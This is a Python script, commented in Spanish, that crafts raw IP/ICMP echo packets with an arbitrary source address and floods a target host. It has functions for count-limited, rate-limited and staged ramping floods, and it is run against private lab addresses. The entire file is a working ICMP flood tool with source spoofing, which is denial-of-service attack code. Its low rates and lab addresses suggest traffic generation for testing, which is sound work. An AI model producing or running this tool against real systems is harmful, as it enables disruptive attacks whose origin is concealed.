import socket
import struct
import random
import time
import signal
import sys

ICMP_ECHO_REQUEST = 8  # Tipo de mensaje ICMP para solicitud de eco
IP_PROTO_ICMP = 1      # Protocolo ICMP

# Variable global para controlar si se debe detener el flood
running = True

def signal_handler(sig, frame):
    """
    Manejador de señal para SIGINT (Ctrl+C).
    Detener el flood de ICMP de manera segura.
    """
    global running
    print("\nInterrupción detectada. Deteniendo el flood ICMP...")
    running = False  # Establece la variable a False para detener el flood

signal.signal(signal.SIGINT, signal_handler)

def checksum(source_string):
    """
    Calcular la suma de verificación de un paquete.
    """
    sum = 0
    countTo = (len(source_string) // 2) * 2
    count = 0
    while count < countTo:
        thisVal = struct.unpack("!H", source_string[count:count+2])[0]
        sum = sum + thisVal
        sum = sum & 0xFFFFFFFF  # Asegurarse de que sea de 32 bits
        count = count + 2

    if countTo < len(source_string):
        sum = sum + source_string[len(source_string) - 1]
        sum = sum & 0xFFFFFFFF

    sum = (sum >> 16) + (sum & 0xFFFF)
    sum = sum + (sum >> 16)
    checksum = ~sum & 0xFFFF
    return checksum

def create_packet(id, source_ip, dest_ip):
    """
    Crear un paquete IP + ICMP.
    """
    # Encabezado IP
    ip_header = struct.pack("!BBHHHBBH4s4s",
                            0x45, 0, 40, 0, 0, 255, IP_PROTO_ICMP,
                            0, socket.inet_aton(source_ip), socket.inet_aton(dest_ip))

    # Crear paquete ICMP
    icmp_header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, 0, id, 1)
    data = bytes([random.randint(0, 255) for _ in range(56)])  # Datos aleatorios (56 bytes)

    # Calculamos el checksum para el ICMP (solo)
    checksum_value = checksum(icmp_header + data)
    icmp_header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, checksum_value, id, 1)

    # Paquete completo
    packet = ip_header + icmp_header + data
    return packet

def flood_icmp(source_ip, target_ip, packet_count=1000):
    """
    Iniciar el flood de ICMP a un destino.
    """
    icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    icmp_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)  # Incluir encabezado IP

    packet_id = random.randint(1, 65535)

    print(f"Iniciando flood ICMP hacia {target_ip}...")


    count = 0
    while running and count < packet_count:  # Continuar enviando paquetes hasta que se reciba la señal de interrupción
        packet = create_packet(packet_id, source_ip, target_ip)
        print(len(packet))
        try:
            icmp_socket.sendto(packet, (target_ip, 1))  # Enviar paquete ICMP
            count += 1
            print(f"Paquete {count} enviado a {target_ip}...")
        except Exception as e:
            print(f"Error al enviar paquete: {e}")

    icmp_socket.close()
    print(f"Flood ICMP detenido. Paquetes enviados: {count}")


def flood_icmp_speed(source_ip, target_ip, speed, duration):
    """
    Realiza un flood ICMP a la velocidad especificada (en Bytes/s) y duración determinada.
    
    Parámetros:
    - source_ip: IP de origen
    - target_ip: IP de destino
    - speed: velocidad en Bytes/s
    - duration: duración en segundos
    """
    icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    icmp_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    test_packet = create_packet(random.randint(1, 65535), source_ip, target_ip)
    packet_size = len(test_packet)
    delay = 1 / (speed / packet_size)

    print(f"Iniciando flood ICMP a {speed} Bytes/s durante {duration} segundos...")

    end_time = time.time() + duration
    packet_id = random.randint(1, 65535)
    count = 0

    while running and time.time() < end_time:
        packet = create_packet(packet_id, source_ip, target_ip)
        try:
            count += 1
            icmp_socket.sendto(packet, (target_ip, 1))
            print(f"Paquete {count} enviado a {target_ip}...")
            time.sleep(delay)

        except Exception as e:
            print(f"Error al enviar paquete: {e}")

    icmp_socket.close()
    print("Flood ICMP finalizado.")


def flood_icmp_speed_series(source_ip, target_ip, speed_list, duration_list):
    """
    Ejecuta un flood ICMP con diferentes velocidades y duraciones sin hilos.

    Parámetros:
    - source_ip: IP de origen
    - target_ip: IP de destino
    - speed_list: lista de velocidades en Bytes/s
    - duration_list: lista de duraciones en segundos
    """
    if len(speed_list) != len(duration_list):
        raise ValueError("Las listas de velocidad y duración deben tener el mismo tamaño")

    for i in range(len(speed_list)):
        speed = speed_list[i]
        duration = duration_list[i]

        print(f"\n--- Iniciando etapa {i+1} ---")
        print(f"Enviando paquetes a {speed} Bytes/s durante {duration} segundos")

        flood_icmp_speed(source_ip, target_ip, speed, duration)

    print("\nFlood ICMP finalizado.")




def flood_icmp_speed_series_transition(source_ip, target_ip, speed_list, duration_list, time_transition, num_transition):
    """
    Ejecuta un flood ICMP con diferentes velocidades y duraciones sin hilos.

    Parámetros:
    - source_ip: IP de origen
    - target_ip: IP de destino
    - speed_list: lista de velocidades en Bytes/s
    - duration_list: lista de duraciones en segundos
    """
    if len(speed_list) != len(duration_list):
        raise ValueError("Las listas de velocidad y duración deben tener el mismo tamaño")
    
    duration_incr = time_transition / num_transition # Duracion de cada etapa de transición entre cada Velocidad del Array

    for i in range(len(speed_list)):
        speed = speed_list[i]
        duration = duration_list[i]

        print(f"\n--- Iniciando etapa {i+1} ---")
        print(f"Enviando paquetes a {speed} Bytes/s durante {duration} segundos")

        flood_icmp_speed(source_ip, target_ip, speed, duration)

        if i < (len(speed_list) - 1):
            print("Iniciando etapa de transición de incremento de velocidad")
            speed_next = speed_list[i+1]
            increase_speed = (speed_next - speed) / num_transition
            count = 0
            time_actual = time.time()
            time_end = time_actual + time_transition
            while time_actual < time_end:
                count += 1
                speed += increase_speed
                time_actual += duration_incr
                print(f"\n--- Iniciando etapa de incremento {count} ---")
                print(f"\nEnviando a {speed} Bytes/s durante {duration_incr} segundos")
                flood_icmp_speed(source_ip, target_ip, speed, duration_incr)


    print("\nFlood ICMP finalizado.")





if __name__ == "__main__":
    source_ip = "192.168.56.102"  # Dirección IP de origen
    target_ip = "192.168.56.101"  # Dirección IP de destino
    # flood_icmp(source_ip, target_ip, packet_count=10000)  # Número de paquetes ICMP a enviar

    speed_list = [100, 500, 1000]  # Velocidades en Bytes/s
    duration_list = [4, 4, 4]  # Duraciones en segundos

    time_transition = 15
    num_transition = 5

    flood_icmp_speed_series_transition(source_ip, target_ip, speed_list, duration_list, time_transition, num_transition)



